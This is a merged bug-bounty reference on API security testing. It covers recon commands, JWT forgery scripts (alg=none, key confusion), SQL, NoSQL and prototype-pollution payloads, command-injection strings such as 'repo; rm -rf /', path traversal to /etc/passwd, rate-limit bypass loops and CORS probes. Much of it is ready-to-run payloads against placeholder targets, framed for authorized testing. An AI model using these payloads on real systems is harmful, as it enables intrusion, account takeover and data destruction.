# API SECURITY — UNIFIED MASTER REFERENCE
> Merged from: web2-vuln-classes (Section 12), telegram-intel (HolyTips API Security checklist), github-x-intel (H1 reports, HolyTips, inonshk 31-days), bountyforge, bb-methodology
> Last updated: 2026-09-22

---

## QUICK START — 5-MINUTE TEST PLAN

```
[ ] 1. Discover all API endpoints (REST, GraphQL, gRPC, WebSocket)
[ ] 2. Test authentication (JWT, OAuth, API keys, session)
[ ] 3. Test authorization (IDOR, mass assignment, RBAC bypass)
[ ] 4. Test input validation (injection, prototype pollution, mass assignment)
[ ] 5. Test rate limiting & DoS
[ ] 6. Test CORS & cross-origin issues
[ ] 7. Prove impact: data access, privilege escalation, ATO
```

---

## API RECON & DISCOVERY

### Endpoint Discovery
```bash
# Passive discovery
crt.sh target.com | grep -iE "api|graphql|rest|v[0-9]" | sort -u
cat domains.txt | gau | grep -iE "api|graphql|rest|v[0-9]/" | uro

# Active discovery
ffuf -u "https://target.com/FUZZ" -w api-wordlist.txt -fc 404
katana -u https://target.com -jc -d 3 -o endpoints.txt

# API documentation
curl -s "https://target.com/swagger.json" | jq .
curl -s "https://target.com/openapi.json" | jq .
curl -s "https://target.com/api-docs" | grep -oE '/api/[^"]+'
curl -s "https://target.com/.well-known/openid-configuration"

# GraphQL introspection
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'

# gRPC reflection
grpcurl -plaintext target.com:443 list
```

### API Documentation Sources
```
- /swagger.json, /swagger.yaml
- /openapi.json, /openapi.yaml
- /api-docs, /api-docs.json
- /swagger-ui.html, /redoc
- /graphql, /graphql/playground
- /.well-known/openid-configuration
- /api/v1/docs, /api/v2/docs
- Postman collections (public workspaces)
```

---

## AUTHENTICATION TESTING

### JWT Testing
```bash
# 1. Algorithm confusion (RS256 → HS256)
# Get public key from /.well-known/jwks.json
# Sign with public key as HMAC secret
python3 -c "
import jwt, requests
pub_key = requests.get('https://target.com/.well-known/jwks.json').json()['keys'][0]
import jwt.algorithms
key = jwt.algorithms.RSAAlgorithm.from_jwk(pub_key)
token = jwt.encode({'sub':'admin','role':'admin'}, key, algorithm='HS256')
print(token)
"

# 2. alg=none
python3 -c "
import jwt, base64, json
header = {'alg':'none','typ':'JWT'}
payload = {'sub':1,'role':'admin'}
token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=') + '.' + \
        base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=') + '.'
print(token)
"

# 3. Key confusion (kid injection)
# If kid parameter used to select key, inject malicious key reference

# 4. Weak secret brute force
jwt_tool -t <token> -C -d /usr/share/wordlists/rockyou.txt

# 5. Token replay / reuse
# Test: same token valid after logout, password change, time expiry

# 6. Claims manipulation
# Modify: exp, iat, nbf, sub, role, permissions, scopes
```

### API Key Testing
```bash
# Common locations
# Header: Authorization: ApiKey xxx, X-API-Key: xxx, Authorization: Bearer xxx
# Query: ?api_key=xxx, ?key=xxx
# Cookie: api_key=xxx

# Test key validity
curl -H "Authorization: ApiKey LEAKED_KEY" https://target.com/api/user/me
curl -H "X-API-Key: LEAKED_KEY" https://target.com/api/user/me

# Test key permissions
# List resources, create, read, update, delete
```

### OAuth / OIDC
```bash
# Test PKCE enforcement
curl -s "https://target.com/oauth2/authorize?response_type=code&client_id=TEST&redirect_uri=https://attacker.com" -w "%{http_code}\n"

# Test state parameter
curl "https://target.com/oauth2/authorize?response_type=code&client_id=TEST&redirect_uri=https://attacker.com&state=random"

# Test redirect_uri bypass (11 techniques)
# See OAuth/OIDC unified skill

# Test token exchange
curl -X POST "https://target.com/oauth2/token" -d "grant_type=authorization_code&code=CODE&client_id=ID&redirect_uri=URI"
```

### Session / Cookie
```bash
# Session fixation
# 1. Get valid session (unauthenticated)
# 2. Force victim to use it
# 3. Victim logs in → session now authenticated

# Cookie attributes
# Check: Secure, HttpOnly, SameSite, Domain, Path, Expires

# Session replay
# Capture session → replay from different IP/UA
```

---

## AUTHORIZATION TESTING (IDOR / RBAC)

### IDOR Testing (See IDOR unified skill)
```bash
# Horizontal (same role)
# User A token + User B ID → access B's data

# Vertical (different role)
# User token + Admin endpoint → admin access

# Object-level
# GET /api/users/123/orders → change to 124
# GraphQL: { user(id: "VICTIM_ID") { email } }
```

### Mass Assignment
```bash
# Test: can user modify privileged fields?
PUT /api/user/profile
{"email": "attacker@evil.com", "role": "admin", "is_admin": true, "balance": 999999}

# Test nested objects
{"user": {"role": "admin"}}
{"profile": {"isAdmin": true}}
{"__proto__": {"admin": true}}  # Prototype pollution
```

### RBAC / Feature Flags
```bash
# Test: user accesses admin endpoints
GET /api/admin/users
GET /api/admin/stats
POST /api/admin/create

# Test: feature flag bypass
# ?feature=new_ui=true
# Header: X-Feature-Flag: admin_panel
```

---

## INPUT VALIDATION & INJECTION

### SQL Injection (See SQLi unified skill)
```bash
# In API params
GET /api/users?id=1' OR '1'='1
POST /api/search {"query": "' UNION SELECT password FROM users--"}

# In JSON
{"id": "1' OR '1'='1"}
{"filter": {"id": {"$ne": null}}}  # NoSQL injection
```

### NoSQL Injection
```bash
# MongoDB
{"$where": "this.password == this.password"}
{"$ne": null}
{"$regex": ".*"}
{"$gt": ""}
{"$exists": true}

# Query operators in body
{"user": {"$ne": null}}
{"$or": [{"email": "admin"}, {"role": "admin"}]}
```

### Prototype Pollution
```javascript
// Server-side (Node.js merge)
{"__proto__": {"admin": true, "role": "admin"}}
{"constructor": {"prototype": {"admin": true}}}

// URL params
?__proto__[admin]=true&__proto__[role]=superadmin
?constructor[prototype][admin]=true

// JSON
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

### Command Injection
```bash
# In API params
GET /api/ping?host=8.8.8.8;id
POST /api/deploy {"repo": "repo; rm -rf /"}

# In file upload metadata
# filename: "; id;.jpg"
```

### Path Traversal
```bash
# API params
GET /api/download?file=../../../etc/passwd
POST /api/read {"path": "../../../etc/passwd"}

# In JSON
{"file": "../../../etc/passwd"}
{"template": "../../../../etc/passwd"}
```

---

## RATE LIMITING & DoS

### Rate Limit Testing
```bash
# Test endpoint limits
for i in {1..100}; do curl -s -o /dev/null -w "%{http_code} " "https://target.com/api/endpoint"; done

# Distributed (bypass IP-based)
for ip in $(cat proxies.txt); do
  curl -H "X-Forwarded-For: $ip" "https://target.com/api/endpoint"
done

# Header manipulation
# X-Forwarded-For, X-Real-IP, X-Client-IP, CF-Connecting-IP, True-Client-IP

# Endpoint confusion
# /api/v1/endpoint vs /api/v2/endpoint vs /mobile/endpoint
```

### DoS via Query Complexity
```bash
# GraphQL depth/complexity
# Deeply nested queries
# Large batch requests
# Expensive field combinations

# Large payloads
POST /api/upload -H "Content-Length: 100000000"
```

---

## CORS & CROSS-ORIGIN

### CORS Misconfiguration
```bash
# Test: reflected origin + credentials
curl -s -I -H "Origin: https://evil.com" https://target.com/api/user/me
# If: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true
# → CRITICAL: attacker reads credentialed responses

# Test wildcard
curl -H "Origin: https://evil.com" https://target.com/api/user/me
# If: Access-Control-Allow-Origin: * (with credentials = invalid, but check)

# Test null origin
curl -H "Origin: null" https://target.com/api/user/me

# Test subdomain
curl -H "Origin: https://sub.target.com" https://target.com/api/user/me

# Check preflight
curl -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Method: POST" https://target.com/api/
```

---

## API VERSIONING & ENDPOINT DISCOVERY

```bash
# Version testing
for v in v1 v2 v3 v4 api/v1 api/v2 mobile legacy; do
  curl -s -o /dev/null -w "$v: %{http_code}\n" "https://target.com/$v/users/1"
done

# Legacy endpoints
# /api/v1/ often has weaker auth than /api/v2/

# Mobile API
# /api/mobile/, /m/, /app/

# Deprecated but accessible
# /api/deprecated/, /api/old/
```

---

## HOLYTIPS API SECURITY CHECKLIST (Complete)

```
[ ] Test version switching: /api/v3/login → /api/v1/login
[ ] Check other AuthN endpoints: /api/mobile/login → /api/v3/login, /api/magic_link
[ ] Verb Tampering: GET /api/trips/1 → POST/PUT/DELETE /api/trips/1, POST /api/trips
[ ] Try Object IDs in HTTP headers and bodies, URLs tend to be less vulnerable
[ ] Try Numeric IDs when facing a GUID/UUID: GET /api/users/6b95d962-df38 → GET /api/users/1
[ ] Wrap ID with an array: {"id":111} → {"id":[111]}
[ ] Wrap ID with a JSON object: {"id":111} → {"id":{"id":111}}
[ ] HTTP Parameter Pollution: /api/profile?user_id=legit&user_id=victim
[ ] JSON Parameter Pollution: {"user_id":legit,"user_id":victim}
[ ] Wildcard instead of ID: /api/users/1 → /api/users/*, /api/users/%, /api/users/_, /api/users/.
[ ] Ruby application HTTP parameter containing a URL → Pipe as first character and shell command
[ ] Developer APIs differs with mobile and web APIs. Test them separately.
[ ] Change Content-Type to application/xml and see if the API parse it.
[ ] Non-Production environments tend to be less secure (staging/qa/etc.) Leverage this fact to bypass AuthZ, AuthN, rate limiting & input validation.
[ ] Export Injection if you see "Convert to PDF" feature.
[ ] Expand your attack surface and test old versions of APKs/IPAs.

Google Dorks:
  site:target.tld inurl:api
  site:target.tld intitle:"index of" "api.yaml"
  site:target.tld inurl:/application.wadl
  site:target.tld ext:wsdl inurl:/%24metadata
  site:target.tld ext:wadl
  site:target.tld ext:wsdl
  user filetype:wadl
  user filetype:wsdl

Check different Content-Types:
  x-www-form-urlencoded → user=test
  application/json → {"user": "test"}
  application/xml → <user>test</user>

If regular POST data try sending arrays, dictionaries:
  username[]=John
  username[$neq]=lalala

If JSON is supported try unexpected data types:
  {"username": "John"}
  {"username": true}
  {"username": null}
  {"username": 1}
  {"username": [true]}
  {"username": ["John", true]}
  {"username": {"$neq": "lalala"}}

If XML is supported, check for XXE
```

---

## HIGH-VALUE H1 REPORTS (2025)

| Bounty | Title | Program | Technique |
|--------|-------|---------|-----------|
| **$10,000** | Arbitrary Read of Another User's Private Repository | GitHub | AuthZ bypass |
| **$5,580** | Mint OAuth2 access token for targeted user | GitLab | OAuth token theft |
| **$3,500** | Shopify Partners Invitation Privilege Escalation | Shopify | AuthZ bypass |
| **$2,700** | Public GitHub repos for H1 managed triage | HackerOne | Info disclosure |
| **$2,000** | Improper bot-auth impersonation | Basecamp | Auth bypass |
| **—** | SSRF in Autodesk Rendering → ATO | Autodesk | SSRF chain |
| **—** | Mint OAuth2 access token for targeted user | GitLab | OAuth token theft |

---

## CHAINS THAT PAY

```
Mass Assignment + role=admin                    → Critical (PrivEsc)
JWT alg=none / key confusion                    → Critical (ATO)
Prototype pollution + admin flag                → Critical (PrivEsc)
CORS reflected origin + credentials             → Critical (Data theft)
IDOR on API + sensitive data                   → High/Critical
Mass assignment + JWT secret overwrite          → Critical
Prototype pollution + JWT secret overwrite      → Critical
API version downgrade (v2→v1) + weaker auth    → High/Critical
CORS + CSRF → ATO                              → Critical
OAuth redirect_uri bypass + token theft         → Critical (ATO)
```

---

## AUTOMATED TESTING (One-Liners)

```bash
# API endpoint discovery
crt.sh target.com | grep -iE "api|graphql" | sort -u

# JWT testing
# alg=none
python3 -c "import jwt,base64,json; h={'alg':'none','typ':'JWT'}; p={'sub':1,'role':'admin'}; print(base64.urlsafe_b64encode(json.dumps(h).encode()).decode().rstrip('=')+'.'+base64.urlsafe_b64encode(json.dumps(p).encode()).decode().rstrip('=')+'.')"

# JWT key confusion
# Get JWKS → sign with public key as HS256

# Prototype pollution
curl -X POST "https://target.com/api/user" -H "Content-Type: application/json" -d '{"__proto__":{"admin":true}}'

# Mass assignment
curl -X PUT "https://target.com/api/user/profile" -H "Content-Type: application/json" -d '{"role":"admin","isAdmin":true}'

# CORS test
curl -s -I -H "Origin: https://evil.com" "https://target.com/api/user/me" | grep -i "access-control-allow-origin"

# Rate limit test
for i in {1..50}; do curl -s -o /dev/null -w "%{http_code} " "https://target.com/api/endpoint"; done; echo ""

# API version testing
for v in v1 v2 v3 api/v1 api/v2 mobile legacy; do curl -s -o /dev/null -w "$v: %{http_code}\n" "https://target.com/$v/users/1"; done

# GraphQL introspection
curl -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{__schema{types{name}}}"}'

# JWT none algorithm
python3 -c "import jwt,base64,json; h={'alg':'none','typ':'JWT'}; p={'sub':1,'role':'admin'}; print(base64.urlsafe_b64encode(json.dumps(h).encode()).decode().rstrip('=')+'.'+base64.urlsafe_b64encode(json.dumps(p).encode()).decode().rstrip('=')+'.')"

# Mass assignment
curl -X PUT "https://target.com/api/user/profile" -H "Content-Type: application/json" -d '{"role":"admin","isAdmin":true,"balance":999999}'

# Prototype pollution
curl -X POST "https://target.com/api/user" -H "Content-Type: application/json" -d '{"__proto__":{"admin":true,"role":"superadmin"}}'

# CORS test
curl -s -I -H "Origin: https://evil.com" "https://target.com/api/user/me" | grep -i "access-control-allow-origin"

# JWT none
python3 -c "import jwt,base64,json; h={'alg':'none','typ':'JWT'}; p={'sub':1,'role':'admin'}; print(base64.urlsafe_b64encode(json.dumps(h).encode()).decode().rstrip('=')+'.'+base64.urlsafe_b64encode(json.dumps(p).encode()).decode().rstrip('=')+'.')"

# Rate limit test
for i in {1..50}; do curl -s -o /dev/null -w "%{http_code} " "https://target.com/api/endpoint"; done; echo ""

# Distributed rate limit bypass
for ip in $(cat proxies.txt); do curl -H "X-Forwarded-For: $ip" "https://target.com/api/endpoint"; done
```

---

## HOLYTIPS API SECURITY CHECKLIST (Full)

```
[ ] Version switching: /api/v3/login → /api/v1/login
[ ] Check other AuthN endpoints: /api/mobile/login → /api/v3/login, /api/magic_link
[ ] Verb Tampering: GET /api/trips/1 → POST/PUT/DELETE /api/trips/1, POST /api/trips
[ ] Try Object IDs in HTTP headers and bodies, URLs tend to be less vulnerable
[ ] Try Numeric IDs when facing a GUID/UUID: GET /api/users/6b95d962-df38 → GET /api/users/1
[ ] Wrap ID with an array: {"id":111} → {"id":[111]}
[ ] Wrap ID with a JSON object: {"id":111} → {"id":{"id":111}}
[ ] HTTP Parameter Pollution: /api/profile?user_id=legit&user_id=victim
[ ] JSON Parameter Pollution: {"user_id":legit,"user_id":victim}
[ ] Wildcard instead of ID: /api/users/1 → /api/users/*, /api/users/%, /api/users/_, /api/users/.
[ ] Ruby application HTTP parameter containing a URL → Pipe as first character and shell command
[ ] Developer APIs differs with mobile and web APIs. Test them separately.
[ ] Change Content-Type to application/xml and see if the API parse it.
[ ] Non-Production environments tend to be less secure (staging/qa/etc.) Leverage this fact to bypass AuthZ, AuthN, rate limiting & input validation.
[ ] Export Injection if you see "Convert to PDF" feature.
[ ] Expand your attack surface and test old versions of APKs/IPAs.
```

### Google Dorks
```
site:target.tld inurl:api
site:target.tld intitle:"index of" "api.yaml"
site:target.tld inurl:/application.wadl
site:target.tld ext:wsdl inurl:/%24metadata
site:target.tld ext:wadl
site:target.tld ext:wsdl
user filetype:wadl
user filetype:wsdl
```

### Content-Type Testing
```
x-www-form-urlencoded → user=test
application/json → {"user": "test"}
application/xml → <user>test</user>
```

### Array/Dictionary Parameters
```
username[]=John
username[$neq]=lalala
```

### JSON Type Confusion
```
{"username": "John"}
{"username": true}
{"username": null}
{"username": 1}
{"username": [true]}
{"username": ["John", true]}
{"username": {"$neq": "lalala"}}
```

### XML / XXE
```
If XML is supported, check for XXE
```

---

## TRIAGE DECISION TREE

```
1. Does API accept attacker-controlled input?
   NO → Not an API bug
   YES → Continue

2. What authentication?
   - None (public API) → Higher bar for impact
   - API Key / JWT / Session → Test auth bypass

3. What impact?
   - Unauthorized data read (PII, secrets)    → High
   - Unauthorized write (modify, delete)       → High
   - Privilege escalation (role=admin)         → Critical
   - ATO via token/OAuth                       → Critical
   - RCE via deserialization/injection         → Critical
   - DoS via rate limit bypass                 → Medium

4. Chain potential?
   + IDOR + sensitive data                     → Critical
   + Mass assignment + role escalation         → Critical
   + JWT bypass + ATO                          → Critical
   + Prototype pollution + RCE                 → Critical
```

---

## KILL LIST (Auto-Reject)

| Pattern | Reason |
|---------|--------|
| Public API with no sensitive data | Info only |
| Rate limit exists but "could bypass if..." | Theoretical = N/A |
| CORS misconfig but no credentials | Low/Info |
| Prototype pollution but no gadget chain | N/A |
| JWT alg=none but signature verified | Not vulnerable |
| Mass assignment but field not in model | Not vulnerable |
| IDOR on public resource | Low/Info |
| "Could chain if..." without chain | Theoretical = N/A |

---

## TOOLS (Consolidated)

| Tool | Purpose |
|------|---------|
| `ffuf` | Endpoint fuzzing, parameter fuzzing |
| `katana` | Fast crawling for API endpoints |
| `nuclei` | API vuln templates (JWT, CORS, mass assignment) |
| `jwt_tool` | JWT testing (alg=none, key confusion, brute) |
| `graphql-cop` | GraphQL security audit |
| `ffuf` | Rate limit testing, endpoint fuzzing |
| `nuclei` | API vuln templates |
| `Burp Suite` | Manual testing, Param Miner |
| `Postman` / `Insomnia` | Manual API testing |
| `graphql-cop` | GraphQL security audit |
| `katana` | Fast crawling |
| `gau` / `waybackurls` | Historical API endpoints |

---

## REFERENCES (All Sources)

- web2-vuln-classes: Section 12 (Mass Assignment, JWT, Prototype Pollution, CORS, ATO paths)
- telegram-intel: HolyTips API Security checklist (complete), @bugbountyresources
- github-x-intel: H1 reports (GitHub $10k, GitLab $5.5k, Shopify $3.5k, Basecamp $2k); HolyTips API checklist; inonshk 31-days-of-API-Security-Tips
- bountyforge: API Security as major attack surface, JWT attacks, prototype pollution
- bb-methodology: Tactical Thinking (API version diff, mass assignment), What-If experiments
- PortSwigger: API security labs, JWT labs, CORS labs
- HackTricks: API security methodology
- inonshk/31-days-of-API-Security-Tips: Daily API tips
- OWASP: API Security Top 10